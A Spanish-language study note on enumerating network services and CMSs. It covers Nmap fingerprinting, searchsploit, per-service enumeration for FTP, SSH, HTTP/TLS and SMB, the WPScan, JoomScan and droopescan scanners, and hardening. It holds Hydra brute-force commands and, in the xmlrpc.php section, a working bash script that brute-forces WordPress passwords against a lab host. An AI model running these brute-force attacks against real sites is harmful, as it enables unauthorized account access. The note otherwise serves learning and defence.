---
tags:
  - ciberseguridad
  - reconocimiento
  - cms
tipo: concepto
estado: terminado
---

# Enumeración de Servicios y CMS

La **enumeración** es el puente entre descubrir puertos y explotar servicios: identificar *qué* corre exactamente (software, versión, configuración, usuarios) y cruzar eso con bases de datos de vulnerabilidades. Un puerto abierto sin enumerar es una puerta sin cerradura a la vista; una versión conocida sin cruzar es información desperdiciada.

> [!info] Flujo de la enumeración
> ```
> puerto abierto → fingerprint (¿qué servicio/versión?) → enumeración (¿qué usuarios/rutas/módulos?)
>               → vulnerability mapping (searchsploit/CVE) → explotación dirigida
> ```
> La regla: **cada hallazgo alimenta el siguiente paso**. La versión de OpenSSH te dice el distro; la distro te dice binarios y rutas; los módulos del CMS te dicen el exploit.

## 1. Fingerprinting de servicios con Nmap

La detección de versión (`-sV`) funciona por **sondeo y comparación**: Nmap envía probes específicos (TLS ClientHello, HTTP GET, SSH banner, comandos propios del protocolo) y empareja la respuesta con su base de firmas `nmap-service-probes`. `-sC` añade los scripts NSE por defecto (default).

```bash
# Descubrimiento + versión + scripts por defecto, salida normal
nmap -p<puertos> -sCV <IP> -oN target

# Versión intensiva (más probes, más ruido, más precisión)
nmap -p22,80,443 -sV --version-intensity 9 -sC -O -oN servicios <IP>
```

| Flag | Efecto |
|---|---|
| `-sV` | Activa la detección de versión (banner + probes) |
| `--version-intensity 0-9` | Profundidad del emparejamiento (9 = agresivo) |
| `--version-all` | Prueba **todos** los probes (ruidoso, lento) |
| `-sC` | Scripts NSE `default` (enum básica, chequeos comunes) |
| `-O` / `--osscan-guess` | Estimación de SO (complementa la versión) |
| `-oN/-oG/-oA` | Guardar resultados para cruzarlos después con `searchsploit` |

> [!tip] Leer el banner como información de sistema
> `OpenSSH 8.2p1 Ubuntu 4ubuntu0.5` no es solo una versión: `4ubuntu0.5` es el **número de revisión del paquete** en Ubuntu — permite inferir el **codename** (Focal = 20.04) y, con él, el estado de parches del resto del sistema. El cruce se hace en <https://launchpad.net/ubuntu> (plataforma donde se rastrean versiones, bugs y cambios de paquetes Debian/Ubuntu).

## 2. De la versión a la vulnerabilidad

```bash
# Coincidencia producto + versión en Exploit-DB local
searchsploit openssh 8.2
searchsploit "vsftpd 2.3.4"
searchsploit --nmap target.xml        # cruce automático con salida de nmap

# Otras fuentes
# NVD:        https://nvd.nist.gov/  (buscar producto + versión)
# Vulners:    scripts NSE de nmap (vulners, vulscan)
# CISA KEV:   vulnerabilidades en explotación activa
```

| Señal de la versión | Acción |
|---|---|
| Versión exacta con exploit público | Candidata nº 1 → verificar PoC y safety antes |
| Versión con CVE pero sin exploit | Buscar config errónea (más común de lo que parece) |
| Banner manipulado/evasivo (`-sV` da `unknown`) | Probar con probes manuales (`nc`, `curl -I`, clientes nativos) |
| Servicio con banner de framework (p. ej. `Server: Apache/2.4.49`) | Cross-site: esa versión + función concreta (mod_proxy) = CVE-2021-41773 |

> [!warning] Falsos positivos
> `-sV` a veces falla por banners editados (`ServerTokens Prod`), proxies delante del servicio o timeouts. **Verifica siempre con el cliente nativo** (`ssh -v`, `openssl s_client`, `ftp`) antes de dar una versión por buena en el informe.

## 3. Enumeración por servicio

### 3.1 FTP (puertos 20/21)

FTP transmite credenciales y datos **en claro**: 21 (control) y 20 (datos en modo activo; en pasivo el cliente negocia un puerto aleatorio).

| Qué buscar | Cómo | Riesgo asociado |
|---|---|---|
| Acceso anónimo | `ftp <IP>` → `anonymous`/`anonymous` | Lectura/escritura de archivos |
| Versiones (vsftpd, proftpd, pure-ftpd) | banner o `nmap -sV` | CVEs de backdoors/bugs conocidos |
| Permisos de directorio (`LIST`, `SITE CHMOD`) | sesión manual | Escritura → webshell |
| Credenciales débiles | [[THC Hydra\|Hydra]] (`hydra -L users.txt -P rockyou.txt ftp://IP`) | Acceso directo |

```bash
# Laboratorio FTP (Docker)
# https://github.com/garethflowers/docker-ftp-server          (autenticado)
# https://github.com/metabrainz/docker-anon-ftp               (anónimo)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10 -V
```

### 3.2 SSH (puerto 22)

Administración remota cifrada — a diferencia de Telnet. Métodos de autenticación: contraseña, clave pública, host-based (poco común).

| Qué buscar | Herramienta | Nota |
|---|---|---|
| Versión/banner | `ssh -v user@IP`, `nmap -sV -p22` | Ubuntu/Debian/FreeBSD según build |
| Diccionario | [[THC Hydra\|Hydra]] (`hydra -L -P ssh://IP`), `medusa` | Rate-limit y bloqueos: `fail2ban` corta el ataque |
| Algoritmos débiles | [[SSLyze Analizador SSL TLS]] no aplica; usar `ssh-audit` | CBC, diffie-hellman-group1, `ssh-rsa` → remediar |
| Claves por defecto / ids_rsa expuestos | buscar en repos y `searchsploit` | Escalada inmediata |

> [!tip] Versión SSH = versión del sistema
> El paquete OpenSSH está fuertemente ligado al SO: `OpenSSH 8.2p1 Ubuntu-4ubuntu0.5` → Ubuntu 20.04 con los parches hasta esa revisión. Útil para estimar qué vulnerabilidades del kernel/distro están o no aplicadas — pero **estimación**, no prueba (usa `nmap -O`, `p0f` o post-explotación para confirmar).

### 3.3 HTTP/HTTPS (80/443)

| Qué buscar | Herramienta | Ejemplo |
|---|---|---|
| Tecnologías y versiones | [[WhatWeb Herramienta de Fingerprinting\|WhatWeb]], Wappalyzer, BuiltWith | `whatweb https://IP` |
| Certificado y cifrado | [[OpenSSL Comandos Principales\|OpenSSL]] | `openssl s_client -connect ejemplo.com:443` |
| Protocolos/cifrados débiles | [[SSLScan]], [[SSLyze Analizador SSL TLS\|SSLyze]] | `sslscan IP:443` |
| Directorios/rutas | [[Gobuster]], [[WFuzz]] | `gobuster dir -u http://IP -w wordlist` |
| Headers de seguridad | `curl -sI` | faltan `HSTS`, `X-Frame-Options`, `CSP`… |

```bash
openssl s_client -connect ejemplo.com:443 </dev/null | openssl x509 -noout -subject -dates -issuer
sslscan IP:443                 # protocolos y cifrados admitidos
sslyze --regular IP            # evaluación profunda de la configuración
```

**SSLScan vs SSLyze**: SSLScan identifica **qué** protocolos/cifrados acepta el servidor (panorama rápido, salida amigable); SSLyze evalúa **la calidad de la configuración** (renegociación, compresión, BEAST/POODLE/Lucky13, OCSP stapling, cabeceras) con informes JSON/XML para automatizar.

> [!warning] Heartbleed (CVE-2014-0160)
> Bug en la extensión Heartbeat de OpenSSL: el servidor devuelve **hasta 64 KB de su memoria por petición** → claves privadas, cookies y credenciales en claro. Detección: `nmap -sV --script ssl-heartbleed` o SSLScan/SSLyze. Laboratorio: <https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160>. Otros clásicos del mismo ámbito: POODLE (SSLv3), BEAST, ROBOT, Shellshock de TLS… ver [[SSLScan]].

### 3.4 SMB (139/445)

**SMB** es el protocolo propietario de Microsoft para compartir archivos/impresoras; **Samba** es su implementación libre para Unix/Linux.

| Herramienta | Uso principal | Flags clave |
|---|---|---|
| **[[SMBMap]]** | Enumerar shares y permisos sin o con credenciales | `-H host` · `-P 445` · `-u user` · `-p pass` · `-d dominio` · `-s share` |
| **[[smbclient Cliente de Línea de Comandos para SMBCIFS\|smbclient]]** | Interacción tipo FTP con el share | `-L //IP` listar · `-U user%pass` · `-c "get archivo"` · `ls/get/put/cd` |
| **[[CrackMapExec Guía de Uso\|CrackMapExec]]** | Auditoría a escala en AD (SMB, WinRM, LDAP, SSH) | ejecución remota, `--shares`, pass-the-hash, módulos |
| **enum4linux-ng** | Usuarios/grupos/flows sin credenciales | reemplazo moderno de enum4linux |

```bash
smbmap -H 192.168.1.10                          # shares anónimos
smbmap -H IP -u usuario -p clave -s SHARE       # con credenciales
smbclient //IP/share -U user%pass -c 'ls; get backup.zip'
mount -t cifs //IP/carpetas /mnt/montaje -o user=U,pass=P   # montar el share
```

> [!info] Montar con CIFS
> El kernel de Linux implementa CIFS (subset de SMB): montar un share permite usarlo con herramientas normales (`cp`, `grep`, `find`). Ventaja para auditoría masiva: `grep -r "password" /mnt/montaje`. Riesgo operativo: recuerda desmontar (`umount /mnt/montaje`) y no dejes credenciales en el comando (quedan en el historial).

Laboratorio: <https://github.com/vulhub/vulhub/tree/master/samba/CVE-2017-7494> (Samba remote code execution).

## 4. Enumeración de CMS

### 4.1 Cómo se detecta un CMS (mecánica)

| Señal | Ejemplo | Fiabilidad |
|---|---|---|
| **Cabecera `X-Powered-By` / cookies** | `X-Powered-By: PHP/7.4`, `wordpress_logged_in_…` | Alta |
| **Meta `generator`** | `<meta name="generator" content="WordPress 6.4.2">` | Alta (se puede ocultar) |
| **Rutas únicas** | `/wp-content/`, `/administrator/`, `/sites/all/`, `/media/jomres/` | Alta |
| **`robots.txt` / `sitemap.xml`** | listan `/wp-admin/`, `/administrator/` | Media |
| **Assets con versión** | `wp-includes/js/wp-emoji-release.min.js?ver=6.4.2` | Alta (versión exacta) |
| **Huella de temas/plugins** | `/wp-content/plugins/contact-form-7/` | Alta — vector de ataque |

```bash
# Huella manual rápida
curl -s https://IP/ | grep -oiE 'generator" content="[^"]+'
curl -s https://IP/robots.txt
curl -s https://IP/ | grep -oP 'plugins/\K[^/]+' | sort -u
#   \K reinicia la coincidencia: se imprime solo lo que va tras "plugins/" hasta el "/"
```

### 4.2 WordPress → [[WPScan]]

```bash
wpscan --url https://example.com                        # fingerprint básico
wpscan --url https://example.com -e u                   # enumerar usuarios
wpscan --url https://example.com -e vp                  # plugins vulnerables
wpscan --url https://example.com -e vt --api-token TOK  # temas + base de datos CVE
wpscan --url https://example.com -U users.txt -P rockyou.txt   # (con autorización)
```

| Elemento | Por qué importa |
|---|---|
| **Core versioned** (`?ver=`) | Versión exacta → CVEs del core |
| **Plugins/temas activos** | 90% de las compromisiones entran por plugins abandonados |
| **Usuarios enumerables** (`/author/nombre`) | Nombre real → phishing/fuerza bruta |
| **`xmlrpc.php`** | Multiplica intentos de login y amplifica DDoS (§4.5) |

Laboratorio: <https://github.com/vavkamil/dvwp> (DVWP — WordPress vulnerable para práctica).

### 4.3 Joomla → [[JoomScan Herramienta de Escaneo|JoomScan]]

```bash
perl joomscan.pl -u https://example.com           # versión + componentes + vulns
joomscan --url https://example.com -w reports.txt
```

Arquitectura Joomla: **componentes** (`com_content`, apps completas), **módulos** (bloques de página: menú, banners) y **plugins** (extensiones pequeñas que enganchan eventos). JoomScan identifica versión, componentes instalados y los CVEs asociados; genera **falsos positivos/negativos** — contrastar siempre con la versión real del fichero `administrator/manifests/files/joomla.xml`.

Laboratorio: <https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562> (SQL injection → RCE en Joomla <3.4.6).

### 4.4 Drupal → [[Droopscan]]

```bash
droopescan scan drupal --url https://example.com
droopescan scan wordpress --url https://example.com    # también hace WP
droopescan scan joomla --url https://example.com
```

Fingerprint: patrones en el código fuente (hashes de plantillas), cabeceras (`X-Generator: Drupal 8`), `CHANGELOG.txt` y estructura de directorios → versión exacta + módulos → CVEs (p. ej. **Drupalgeddon** CVE-2018-7600: <https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600>).

### 4.5 Magento y otras plataformas

```bash
php magescan.phar scan:all https://example.com     # [[Tabla de Opciones Principales de MageScan|MageScan]]
```

Magento es e-commerce de gran superficie de ataque: permisos de ficheros incorrectos, extensiones desactualizadas, y —el clásico— **SQL injection** (p. ej. <https://github.com/vulhub/vulhub/tree/master/magento/2.2-sqli>) que permite robar una **cookie de sesión** y hacer *cookie hijacking*: asumir la identidad del administrador sin credenciales.

### 4.6 `xmlrpc.php` de WordPress: enumeración y fuerza bruta amplificada

`xmlrpc.php` expone el protocolo XML-RPC para clientes externos (apps móviles, publicadores). Permite **listar métodos** y, con `wp.getUsersBlogs`, probar miles de credenciales en **una sola petición** (bypass de los límites de login de WordPress).

```xml
<!-- file.xml — listar métodos disponibles -->
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
```

```bash
curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml
```

![[Pasted image 20250823143647.png]]

El método que nos interesa es `wp.getUsersBlogs` (prueba usuario+contraseña):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>usuario</value></param>
    <param><value>contraseña</value></param>
  </params>
</methodCall>
```

```bash
curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@bruteforce.xml
# Incorrect username or password.   → credencial mala (sigue iterando)
```

![[Pasted image 20250823144626.png]]

Script de laboratorio que itera `rockyou` contra el método:

```bash
#!/bin/bash
function ctrl_c() { echo -e "\n\nSaliendo......\n\n"; tput cnorm; exit 1; }
trap ctrl_c SIGINT

function createXML() {
  password=$1
  xmlfile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
     <param><value>stark</value></param>
     <param><value>$password</value></param>
  </params>
</methodCall>
"""
  echo $xmlfile > file.xml
  response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)
  if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
    echo -e "[+] La contraseña para el usuario stark es $password"
    exit 0
  fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do
  createXML $password
done
```

![[Pasted image 20250823151734.png]]

> [!tip] `trap SIGINT`
> El manejador `ctrl_c` captura Ctrl+C para restaurar el cursor (`tput cnorm`) y salir limpio — patrón estándar de los scripts interactivos del vault (ver [[Bash Scripting - Fundamentos Básicos]]).

> [!warning] Defensa contra xmlrpc.php
> WordPress deshabilitó `xmlrpc.php` por defecto en instalaciones nuevas (la REST API lo reemplazó), pero sigue activo en sitios antiguos: bloquearlo (`location = /xmlrpc.php { deny all; }` en Nginx) elimina la amplificación de fuerza bruta y el abuso de pingbacks para DDoS. Como atacante, comprueba primero que exista: `curl -s -X POST https://target/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'`.

## 5. Tabla metodológica de enumeración

| Paso | Objetivo | Herramienta principal | Salida esperada |
|---|---|---|---|
| 1. Fingerprint de servicio | Producto + versión por puerto | `nmap -sV -sC` | Tabla puerto → servicio → versión |
| 2. Banner manual | Confirmar/afinar versión | `nc`, `curl -I`, clientes nativos | Banner exacto, cabeceras |
| 3. Vulnerabilidades | CVE/Exploit por versión | `searchsploit`, NVD, KEV | Lista priorizada |
| 4. Enumeración funcional | Usuarios, shares, rutas, módulos | Hydra, SMBMap, Gobuster, WPScan… | Superficie de ataque |
| 5. Cross-reference | Correlacionar hallazgos | notas + informe | Hipótesis de explotación |
| 6. Validación segura | Confirmar sin romper | PoC mínimo, laboratorio | Evidencia reproducible |

## 6. Endurecimiento (lado defensor)

| Servicio | Medida |
|---|---|
| **FTP** | Prohibir anónimo; usar **SFTP/FTPS**; restringir directorios; cerrar 20/tcp si no se usa activo |
| **SSH** | Solo claves (`PasswordAuthentication no`), `AllowUsers`, fail2ban, deshabilitar algoritmos antiguos, puerto no estándar reduce ruido (no seguridad) |
| **HTTP** | Quitar versiones (`ServerTokens Prod`, `X-Powered-By: off`), WAF, HTTPS + HSTS, rate limiting en login |
| **TLS** | TLS 1.2/1.3 únicamente; deshabilitar SSLv2/v3 y CBC; patches Heartbleed/ROBOT |
| **SMB** | SMBv1 off, compartir lo mínimo, credenciales fuertes, acceso por ACL, cifrado firma obligatoria |
| **CMS** | Actualizar core/plugins, eliminar meta generator, ocultar `xmlrpc.php`, deshabilitar enumeración de usuarios, 2FA, backups probados |
| **Global** | No exponer banners detallados; segmentación; IDS con reglas de enum masiva |

## 7. Errores comunes

1. **Confiar en la versión de `-sV` sin confirmarla**: los banners se editan y los probes fallan detrás de proxies.
2. **Enumerar sin plan**: hacer `gobuster`, `wpscan` y `hydra` a la vez contra todo sin jerarquizar → ruido y bloqueos.
3. **Olvidar el alcance**: los scaneos agresivos en producción pueden caer servicios viejos (FTP de 2005 se muere con un intento de login malformado).
4. **No guardar evidencias**: cada enumeración debe ir a un `-oN`/informe con timestamps.
5. **Confundir share con permisos**: `smbmap` dice "READ, WRITE" contra el *server*; valida siempre escribiendo un fichero de prueba.
6. **Falsos positivos de WPScan/JoomScan/Droopscan**: contrastar la versión por ruta directa (`/administrator/manifests/files/joomla.xml`, `readme.txt`) antes de explotar.
7. **Ignorar usuarios enumerados**: `wp.getUsersBlogs`/`/author/x` dan usuarios reales → con `rockyou`+reglas suele caer la cuenta antes que cualquier exploit.

## 8. Cheatsheet

```bash
nmap -p- -sV --version-intensity 9 -sC -oN enum <IP>     # fingerprint
searchsploit --nmap enum.xml                              # versión → exploit
nc -v <IP> 21/22/25                                       # banner manual
curl -sI https://IP | grep -iE 'server|x-powered|set-cookie'
curl -s https://IP/ | grep -oiE 'generator" content="[^"]+"'
whatweb -v https://IP                                     # tecnologías

# por servicio
hydra -L users.txt -P rockyou.txt ftp://IP                 # FTP/SSH…
smbmap -H IP -u U -p P; smbclient //IP/share -U U%P        # SMB
wpscan --url https://IP -e u,vp                            # WordPress
joomscan -u https://IP                                     # Joomla
droopescan scan drupal --url https://IP                    # Drupal
php magescan.phar scan:all https://IP                      # Magento
```

## 9. Referencias

- Nmap version detection: <https://nmap.org/book/man-version-detection.html>
- Exploit Database: <https://www.exploit-db.com/> · NVD: <https://nvd.nist.gov/>
- WPScan: <https://wpscan.com/> · Droopescan: <https://github.com/SamJoan/droopescan>
- JoomScan (OWASP): <https://github.com/OWASP/joomscan>
- MageScan: <https://github.com/steverobbins/magescan>
- Launchpad (versiones de paquetes Ubuntu): <https://launchpad.net/ubuntu>
- Vulhub (laboratorios FTP/SMB/CMS): <https://github.com/vulhub/vulhub>

## Relacionadas

- [[Reconocimiento y Escaneo de Redes y Web]] — la fase que precede a esta
- [[Nmap Guía Completa]] — todos los modos y scripts NSE
- [[WPScan]] · [[Droopscan]] · [[JoomScan Herramienta de Escaneo]] · [[Tabla de Opciones Principales de MageScan|MageScan]] — herramientas CMS
- [[WhatWeb Herramienta de Fingerprinting]] · [[Gobuster]] · [[WFuzz]] — fingerprint y rutas web
- [[THC Hydra|Hydra]] · [[SMBMap]] · [[smbclient Cliente de Línea de Comandos para SMBCIFS|smbclient]] · [[CrackMapExec Guía de Uso|CrackMapExec]] — por servicio
- [[SSLScan]] · [[OpenSSL Comandos Principales]] — TLS
- [[Introducción a la Explotación de Vulnerabilidades]] — qué hacer con los hallazgos
